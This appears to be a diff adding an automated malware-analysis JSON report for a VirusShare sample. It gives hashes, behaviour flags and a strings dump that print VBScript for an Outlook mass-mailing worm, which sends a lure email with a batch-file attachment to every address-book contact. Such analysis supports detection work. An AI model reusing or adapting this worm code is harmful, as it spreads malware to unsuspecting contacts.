@@ -1,0 +1,58 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "CreateObject": "May create an OLE object",
+            "Shell": "May run an executable file or a system command",
+            "Wscript.Shell": "May run an executable file or a system command"
+        },
+        "macro": "%i%.on error resume next\ndim a,b,c,d,e\nset a = Wscript.CreateObject(\"Wscript.Shell\")\nset b = CreateObject(\"Outlook.Application\")\nset c = b.GetNameSpace(\"MAPI\")\nfor y = 1 To c.AddressLists.Count\nset d = c.AddressLists(y)\nx = 1\nset e = b.CreateItem(0)\nfor o = 1 To d.AddressEntries.Count\nf = d.AddressEntries(x)\ne.Recipients.Add f\nx = x + 1\nnext\ne.Subject = \"An attachment\"\ne.Body = \"I would like to show you the work that i want to give to you.This is the installer.\"\ne.Body = \"bye!!\" >>c:\\i.vbs\ne.Attachments.Add (\"c:\\i.bat\")\ne.DeleteAfterSubmit = False\ne.Send\nf = \"\"\nnext"
+    },
+    "filename": "VirusShare_3a5ea422c875287c547ead9d2e19d7ac",
+    "filesize": 593,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "3a5ea422c875287c547ead9d2e19d7ac",
+        "sha1": "9c2faa5e4718c6c341e4b6b373ecb2da9e3d972d",
+        "sha256": "c0dfe4a0e2eb3b53fcb2a015b9d143a0bb1bab4debbc2cc113172826614dd81a"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "%i%.on error resume next",
+            "dim a,b,c,d,e",
+            "set a = Wscript.CreateObject(\"Wscript.Shell\")",
+            "set b = CreateObject(\"Outlook.Application\")",
+            "set c = b.GetNameSpace(\"MAPI\")",
+            "for y = 1 To c.AddressLists.Count",
+            "set d = c.AddressLists(y)",
+            "x = 1",
+            "set e = b.CreateItem(0)",
+            "for o = 1 To d.AddressEntries.Count",
+            "f = d.AddressEntries(x)",
+            "e.Recipients.Add f",
+            "x = x + 1",
+            "next",
+            "e.Subject = \"An attachment\"",
+            "e.Body = \"I would like to show you the work that i want to give to you.This is the installer.\"",
+            "e.Body = \"bye!!\" >>c:\\i.vbs",
+            "e.Attachments.Add (\"c:\\i.bat\")",
+            "e.DeleteAfterSubmit = False",
+            "e.Send",
+            "f = \"\"",
+            "next"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.263335",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
